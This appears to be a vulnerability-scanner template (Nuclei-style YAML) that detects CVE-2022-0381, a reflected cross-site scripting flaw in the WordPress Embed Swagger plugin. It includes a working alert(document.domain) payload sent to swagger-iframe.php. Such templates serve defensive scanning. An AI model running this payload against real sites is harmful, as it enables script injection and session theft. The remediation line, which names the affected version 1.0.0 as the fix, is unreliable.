flow: http(1) && http(2)
http:
- matchers:
  - condition: and
    internal: true
    type: word
    words:
    - Embed Swagger
    - 'Tags:'
  raw:
  - 'GET /wp-content/plugins/embed-swagger/readme.txt HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - part: header
    type: word
    words:
    - text/html
  - part: body
    type: word
    words:
    - 'url: "xss://"-alert(document.domain)'
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/wp-content/plugins/embed-swagger/swagger-iframe.php?url=xss://%22-alert(document.domain)-%22'
id: CVE-2022-0381
info:
  author: edoardottt
  classification:
    cpe: cpe:2.3:a:embed_swagger_project:embed_swagger:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2022-0381
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.91661
    epss-score: 0.07802
  description: 'WordPress Embed Swagger plugin 1.0.0 and prior contains a reflected
    cross-site scripting vulnerability due to insufficient escaping/sanitization and
    validation via the url parameter found in the ~/swagger-iframe.php file, which
    allows attackers to inject arbitrary web scripts onto the page.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary JavaScript code in the context of the victim''s browser, potentially
    leading to session hijacking, defacement, or theft of sensitive information.

    '
  metadata:
    framework: wordpress
    max-request: 2
    product: embed_swagger
    vendor: embed_swagger_project
  name: WordPress Embed Swagger <=1.0.0 - Cross-Site Scripting
  reference:
  - https://gist.github.com/Xib3rR4dAr/4b3ea7960914e23c3a875b973a5b37a3
  - https://www.wordfence.com/vulnerability-advisories/#CVE-2022-0381
  - https://nvd.nist.gov/vuln/detail/CVE-2022-0381
  - https://plugins.trac.wordpress.org/browser/embed-swagger/trunk/swagger-iframe.php#L59
  - https://github.com/ARPSyndicate/cvemon
  remediation: 'Update to the latest version of the WordPress Embed Swagger plugin
    (1.0.0) or apply a patch provided by the vendor.

    '
  severity: medium
  tags: cve,cve2022,swagger,xss,wordpress,embed_swagger_project,vuln
